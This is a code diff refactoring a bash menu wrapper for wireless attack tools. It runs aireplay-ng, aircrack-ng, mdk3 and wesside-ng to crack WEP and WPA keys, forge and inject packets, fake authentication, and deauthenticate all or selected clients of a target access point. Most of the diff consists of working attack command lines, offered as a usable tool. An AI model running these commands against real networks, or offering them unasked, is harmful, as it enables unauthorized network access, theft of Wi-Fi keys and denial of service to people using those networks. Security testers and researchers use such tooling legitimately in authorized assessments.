@@ -23,7 +23,7 @@ function menu {
 
 ## This is for SCAN (1) option: ###########################
 function choosetype {
-if [ "$AUTO" == 1 ]; then ENCRYPT=""; return; fi
+if [ "$AUTO" -eq 1 ]; then ENCRYPT=""; return; fi
 
 while true; do $clear
   mkmenu "Select encryption" "No filter" "OPN (open)" "WEP" "WPA" "WPA1" "WPA2" "Return to main menu"
@@ -228,16 +228,15 @@ done
 		}
 
 # This is for ATTACK (3) option
-function witchattack {
-    if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then monmode && attackwep
-    elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then monmode && attackwpa
+function witchattack { monmode
+    if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then attackwep
+    elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then attackwpa
     else attackopn; fi
 }
 
 	# If wep
 	function attackwep {
-	while true; do
-	  $clear   # FIXME Implement divissions and No-numbered stuffs for submenus and so.
+	while true; do $clear   
 	  echo -e -n "`gettext '
 	  +----------WEP ATTACKS---------------+
 	  |   Attacks not using a client       |
@@ -276,8 +275,8 @@ function witchattack {
 	    6 ) hirteattack ;$clear; break ;;
 	    7 ) attackclient ;$clear; break ;;
 	    8 ) interactiveattack ;$clear; break ;;
-	    9 ) fragmentationattack ;$clear; break ;;
-	    10 ) fragmentationattackclient;$clear ; break ;;  
+	    9 ) fragmentationattack -5 ;$clear; break ;;
+	    10 ) fragmentationattack -7 ;$clear ; break ;;  
 	    11 ) chopchopattackclient;$clear ; break ;;
 	    12 ) pskarp ;$clear; break ;;
 	    13 ) $clear;break ;;
@@ -289,7 +288,7 @@ function witchattack {
 
 		#Option 1 (fake auth auto)
 		function fakeautoattack {
-			if [ "$INTERACTIVE" == 1]; then
+			if [ "$INTERACTIVE" == 1 ]; then
 				
 				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
 					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
@@ -300,7 +299,7 @@ function witchattack {
 				FT="f"
 			fi
 
-			capture & execute "`gettext \"Injection: Host: $Host_MAC\"`" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake
+			capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake
 
 		}
 		#Option 2 (fake auth interactive)
@@ -314,29 +313,30 @@ function witchattack {
 				INJMAC="FF:FF:FF:FF:FF:FF"
 				FT="0841"
 			fi
-			capture & execute  "`gettext 'Interactive Packet Sel on Host: $Host_SSID'`" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
+			capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
 		}
 
 		#Option 3 (fragmentation attack)
 		function fragnoclient {
 			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng 
-		$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG  "`gettext  \"Fragmentation attack on $Host_SSID\"` " $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & choosefake &  injectmenu
+            execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & choosefake &  injectmenu
 			}
 
 		#Option 4 (chopchopattack)
 		function chopchopattack {
-			$clear && rm -rf $DUMP_PATH/$Host_MAC* replay_dec-*.xor
-			capture &  fakeauth3 & $CDCMD  $TERMINAL $HOLD $TITLEFLAG  "`gettext 'ChopChoping:'` $Host_SSID " $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $IWIFI & injectmenu
+			$clear && hardclean  replay_dec-*.xor
+			capture &  fakeauth3 & 
+            execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $IWIFI & injectmenu
 		}
 		#Option 5 (caffe late attack)
 		function cafelatteattack {
-			capture & execute  "`gettext 'Cafe Latte Attack on:'` $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
+			capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
 			}
 
 		#Option 6 (hirte attack)
 		function hirteattack {
-			capture & execute "`gettext 'Hirte Attack on:'` $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
+			capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
 		}
 
 		#Option 7 (Auto arp replay)
@@ -347,7 +347,7 @@ function witchattack {
 				read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
 					if [ "$FT" = "" ]; then FT="f"; fi
 			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
-			capture & execute "`gettext 'Injection:'` `gettext 'Host'` : $Host_MAC `gettext 'Client'` : $Client_MAC" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
+			capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 8 (interactive arp replay)
@@ -358,39 +358,32 @@ function witchattack {
 				read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
 					if [ "$FT" = "" ]; then FT="0841"; fi
 			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
-			capture & execute "`gettext 'Interactive Packet Sel on:'` $Host_SSID" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
+			capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 9 (fragmentation attack)
 		function fragmentationattack {
 			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng
-			$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext \"Fragmentation attack on $Host_SSID\"`" $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
-		}
-
-		#Option 10 (fragmentation attack with client)
-		function fragmentationattackclient {
-			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-			killall -9 airodump-ng aireplay-ng
-			$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext \"Fragmentation attack on $Host_SSID\"`" $EXECFLAG $AIREPLAY -7 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
+            execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
 		}
 		#Option 11
 		function chopchopattackclient {
-			$clear && rm -rf $DUMP_PATH/$Host_MAC* replay_dec-*.xor
-			capture & execute "`gettext 'ChopChoping: $Host_SSID'`" $AIREPLAY --chopchop -h $Client_MAC $IWIFI & injectmenu
+			$clear && hardclean  replay_dec-*.xor
+			capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $IWIFI & injectmenu
 		}
 		#Option 12 (pskarp)
 		function pskarp {
 			rm -rf $DUMP_PATH/arp_*.cap
 			$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
-			capture & $CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext \"Sending forged ARP to: $Host_SSID\"`" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
+            execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
 		}
 		# End of subproducts.
 
 	# If wpa
 	function wpahandshake {
-		$clear && rm -rf $DUMP_PATH/$Host_MAC*
-		execute "`gettext 'Capturing data on channel:'` $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
+		$clear && hardclean 
+		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 	}
 
 	function attackopn { # If no encryption detected
@@ -415,15 +408,15 @@ done
 
 	# 1 just capture
 	function wpahandshake {
-		$clear && rm -rf $DUMP_PATH/$Host_MAC*
-		execute "`gettext 'Capturing data on channel:'` $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
+		$clear && hardclean
+		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 	}
 
 	# 2 Use tkiptun-ng
 	function tkiptunstdqos {
-		$clear && rm -rf $DUMP_PATH/$Host_MAC*
+		$clear && hardclean 
 		ifconfig $WIFICARD channel $Host_CHAN # Hope this is ok for all cards
-		execute "`gettext 'Executing tkiptun-ng for ap'` $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $WIFI & menufonction
+		execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $WIFI & menufonction
 	}
 
    
@@ -461,11 +454,13 @@ function selectcracking {
         mkmenu "WEP Cracking Options" "aircrack-ng PTW attack" "aircrack-ng standard" "aircrack-ng user options"
 		read yn
 		case $yn in
-		    1 ) $TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking-PTW: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
-	    	2 ) $TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
-	    	3 ) read -p "Insert Fudge Factor: " FUDGE_FACTOR
-			read -p "`gettext 'Type encryption size (64,128...): '`" ENC_SIZE
-			$TERMINAL $HOLDFLAG $TITLEFLAG "`gettext 'Manual cracking:'` $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction ; $clear; break ;;
+	    	2 ) execute $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
+	    	3 ) read -p "Insert Fudge Factor: " FUDGE_FACTOR;
+                read -p "`gettext 'Type encryption size (64,128...): '`" ENC_SIZE
+			    execute "Manual cracking" $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR\
+                -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-*.cap & 
+                menufonction ; $clear; 
+                break ;;
 	    	* ) echo "`gettext 'Unknown response. Try again'`" ;;
 		esac
 		done
@@ -473,99 +468,82 @@ function selectcracking {
 
 	# This is for wpa cracking
 	function wpacrack {
-		$TERMINAL $HOLDFLAG $TOPRIGHT $TITLEFLAG "Aircracking: $Host_SSID" $EXECFLAG $AIRCRACKOLD $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
+        execute $AIRCRACK $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
 	}
 	
 # This is for Fake auth  (5)  option
-
-##########################################################################################
-# This is the function to select Target from a list					 #
-# MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room #
-# And HIRTE for making all those great patch and fixing the SSID issue			 #
-##########################################################################################
 function choosefake {
-if [ "$Host_SSID" = "" ]
-then
-	$clear
-	echo "ERROR: You have to select a target first"
+if [ "$Host_SSID" = "" ]; then $clear; echo "ERROR: You have to select a target first"
 else
     if [ "$INTERACTIVE" == "1" ]; then
     	while true; do
             mkmenu "Fake Auth Method" "Conservative" "Standard" "Progressive"
-    		read yn
-	    	case $yn in
+    		read yn; case $yn in
 		    	1 ) fakeauth1 ;$clear; break ;;
 		    	2 ) fakeauth2 ;$clear; break ;;
 		    	3 ) fakeauth3 ;$clear; break ;;
 		    	* ) echo "Unknown response. Try again" ;;
 	        esac
     	done
-    else
-        fakeauth1||fakeauth2||fakeauth3; $clear;
-    fi
+    else fakeauth1||fakeauth2||fakeauth3; $clear; fi
 fi
 }
 
 
 # Those are subproducts of choosefake
 	function fakeauth1 {
-		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'` $Host_SSID " $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
+        execute "Fake auth (1)" $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
 	}
 	function fakeauth2 {
-		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'`$Host_SSID" $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
+        execute "Fake auth (2)" $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
 	}
 	function fakeauth3 {
-		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'`$Host_SSID" $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
+        execute "Fake auth (3)" $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
 	}
 	
 
 # This is for deauth  (6)  option
-
 function choosedeauth {
-if [ "$Host_SSID" = "" ]
-then
-	$clear
+if [ "$Host_SSID" = "" ]; then $clear
 	echo "ERROR: You have to select a target first"
 else
 	while true; do
-    arrow; mkmenu "Who do you want to deauth?" "Everybody" "Myself (fake mac)" "Selected client"
-	read yn
-	case $yn in
-	1 ) deauthall ; $clear ; break ;;
-	2 ) deauthfake ; $clear ; break ;;
-	3 ) deauthclient ; $clear; break ;;
-	* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-
-	esac
+        arrow; mkmenu "Who do you want to deauth?" "Everybody" "Myself (fake mac)" "Selected client"
+    	read yn; $clear
+	    case $yn in
+            1 ) deauthall ; break ;;
+            2 ) deauthfake ; break ;;
+            3 ) deauthclient ; break ;;
+            * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+	    esac
 	done
 fi
 }
 
 	# Subproducts of choosedeauth
 		function deauthall {
-			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking everybody from:'` $Host_SSID" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
+            execute "Deauth All" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
 		}
 		
 		function deauthclient {
-		if [ "$Client_MAC" = "" ]
-		then	
-			$clear
-			echo "ERROR: You have to select a client first"
-		else
-			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking $Client_MAC from:'` $Host_SSID" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $IWIFI
+		if [ "$Client_MAC" = "" ]; then 
+            $clear; echo "ERROR: You have to select a client first"
+		else 
+            execute "Deauth client" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC \
+            -c $Client_MAC $IWIFI
 		fi
 		}
 		
 		function deauthfake {
-			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking'` $FAKE_MAC ( $Host_SSID )" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $IWIFI
+            execute "Deautenticating" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $IWIFI
 		}
 
 
 # This is for others  (7)  option
 
-function optionmenu {
+function optionmenu { # FIXME make an option to store the resulting pw in a variable.
 	while true; do
-    mkmenu "Test injection" "Select another interface" "Reset selected interface" "Change MAC of interface" "Mdk3" "Wesside-ng" "Enable monitor mode" "Checks with airmon-ng" "Change DUMP_PATH" "Merge all ivs from all sessions" "Return to main menu"
+    mkmenu "Test injection" "Select another interface" "Reset selected interface" "Change MAC of interface" "Mdk3" "Wesside-ng" "Enable monitor mode" "Checks with airmon-ng" "Change DUMP_PATH" "Merge all ivs from all sessions" "Decrypt current packages" "Return to main menu"
     	read yn; case $yn in
         	1 ) inject_test ; $clear; break ;;
         	2 ) setinterface2 ; $ClEAR; break ;;
@@ -586,7 +564,7 @@ function optionmenu {
 # I suppose all these are part of this option:
 	# 1.
 	function inject_test {
-		$TERMINAL $HOLD $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --test & menufonction
+        execute "Test injection" $AIREPLAY $IWIFI --test & menufonction
 	}
 	# 2.
 	function setinterface2 {
@@ -661,56 +639,43 @@ function optionmenu {
 		}
 
 			function mdkpain {
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'MDK attack'`" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $MDK3 $WIFI d & choosemdk
+                execute "MDK3 Pain" $MDK3 $WIFI d & choosemdk
 			}
 
 			function mdktargetedpain {
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'MDK attack on AP:'` $Host_SSID" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $MDK3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
+                execute "MDK3 Targeted pain" $MDK3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
 			}
 
 			function mdknewtarget {
 				ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
-				head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
-				$clear
-				echo "        Detected Access point list"
-				echo ""
-				echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
-				echo ""
+				head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
+                echo " +--------------------------------------------------------------------+"
+				echo " |       Detected Access point list                                   |"
+				echo " |      MAC                      CHAN    SECU    POWER   #CHAR   SSID |"
+                echo " |                                                                    |"
 				i=0
 				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 					longueur=${#MAC}
-					if [ $longueur -ge 17 ]; then
-					i=$(($i+1))
-					echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
-					aidlenght=$IDLENGTH
-					assid[$i]=$ESSID
-					achannel[$i]=$CHANNEL
-					amac[$i]=$MAC
-					aprivacy[$i]=$PRIVACY
-					aspeed[$i]=$SPEED
+                    if [ $longueur -ge 17 ]; then i=$(($i+1))
+					    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
+					    aidlenght=$IDLENGTH; assid[$i]=$ESSID; achannel[$i]=$CHANNEL;
+					    amac[$i]=$MAC; aprivacy[$i]=$PRIVACY; aspeed[$i]=$SPEED
 					fi
 				done < $DUMP_PATH/dump-02.csv
 				echo -n "\n        Select target               "
 				read choice
-					idlenght=${aidlenght[$choice]}
-					ssid=${assid[$choice]}
-					channel=${achannel[$choice]}
-					mac=${amac[$choice]}
-					privacy=${aprivacy[$choice]}
-					speed=${aspeed[$choice]}
-					Host_IDL=$idlength
-					Host_SPEED=$speed
-					Host_ENC=$privacy
-					Host_MAC=$mac
-					Host_CHAN=$channel
-					acouper=${#ssid}
-					fin=$(($acouper-idlength))
-					Host_SSID=${ssid:1:fin}
+					idlenght=${aidlenght[$choice]};	ssid=${assid[$choice]};
+					channel=${achannel[$choice]}; mac=${amac[$choice]};
+					privacy=${aprivacy[$choice]};speed=${aspeed[$choice]};
+					Host_IDL=$idlength;Host_SPEED=$speed;
+					Host_ENC=$privacy;Host_MAC=$mac;
+					Host_CHAN=$channel;acouper=${#ssid};
+					fin=$(($acouper-idlength));Host_SSID=${ssid:1:fin};
 					choosemdk
 			}
 
 			function mdkauth {
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack on AP:'` $Host_SSID" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $MDK3 $WIFI a & choosemdk
+                execute "MDK3 AUTH" $MDK3 $WIFI a & choosemdk
 			}
 
 	# 6.
@@ -731,22 +696,22 @@ function optionmenu {
 
 			function wesside {
 				rm -rf prga.log wep.cap key.log
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'`" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -i $WIFI & choosewesside
+                execute "Wesside-ng" $WESSIDE -i $WIFI & choosewesside
 			}
 
 			function wessidetarget {
 				rm -rf prga.log wep.cap key.log
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -i $WIFI & choosewesside
+                execute "Wesside-ng" $WESSIDE -v $Host_MAC -i $WIFI & choosewesside
 			}
 
 			function wessidetargetmaxer {
 				rm -rf prga.log wep.cap key.log
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -k 1 -i $WIFI & choosewesside
+                execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 1 -i $WIFI & choosewesside
 			}
 
 			function wessidetargetpoor {
 				rm -rf prga.log wep.cap key.log
-				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -k 3 -i $WIFI & choosewesside
+                execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 3 -i $WIFI & choosewesside
 			}
 
 			function wessidenewtarget {
@@ -785,7 +750,7 @@ function optionmenu {
 						acouper=${#ssid}
 						fin=$(($acouper-idlength))
 						Host_SSID=${ssid:1:fin}
-						$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID9" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -i $WIFI & choosewesside
+                        execute "Wesside" $WESSIDE -v $Host_MAC -i $WIFI & choosewesside
 			}
 
 
@@ -795,6 +760,13 @@ function optionmenu {
 		if [ "$TYPE" = "Atherosmadwifi-ng" ]; then $AIRMON check wifi0
 		else $AIRMON check $WIFICARD; fi
 	}
+
+mergethisivs(){ # TODO Untested
+    for i in $DUMP_PATH/$Host_MAC*.cap; do 
+        cur=$( $cur + `$IVSTOOLS --convert $i /dev/null|grep IVs|awk '{print $2}'`)
+    done
+    return $cur
+}
 
 mergeallivs(){ # TODO Untested
     newdir=`mktemp -d`
@@ -817,34 +789,21 @@ function injectmenu {
 	while true; do
         mkmenu "Frag Injection" "Frag with client injection" "Chopchop injection" "Chopchop with client inj." "Return to main menu"
 		read yn; case $yn in
-			1 ) fragnoclientend ; break ;;
-			2 ) fragmentationattackend ; break ;;
-			3 ) chopchopend ; break ;;
-			4 ) chopchopclientend ; break ;;
+			1 ) fragend $Client_MAC ; break ;;
+			2 ) fragend $FAKE_MAC; break ;;
+			3 ) chopchopend $FAKE_MAC ; break ;;
+			4 ) chopchopend $CLIENT_MAC ; break ;;
 			* ) $clear; break;;
 		esac
 	done
 }
 
-	function fragnoclientend {
+	function fragend {
 		if [ "$Host_MAC" = "" ]; then
 			$clear && echo `gettext 'ERROR: You must select a target first'`
 		else
 		    $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-		    $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG\
-            "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r \
-           $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $IWIFI & menufonction
-		fi
-	}
-
-	function fragmentationattackend {
-		if [ "$Host_MAC" = "" ]; then
-			$clear;	echo `gettext 'ERROR: You must select a target first' `
-		else
-	        $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-            $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG \
-            "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r \
-            $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
+            execute "Fragmentation without client" $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $1 -x $INJECTRATE $IWIFI & menufonction
 		fi
 	}
 
@@ -854,37 +813,26 @@ function injectmenu {
 		else
 		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
-		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
-		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $IWIFI & menufonction
-		fi
-	}
-
-	function chopchopclientend {
-		if [ "$Host_MAC" = "" ];then
-			$clear && echo `gettext 'ERROR: You must select a target first' `
-		else
-		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
-		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
-		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
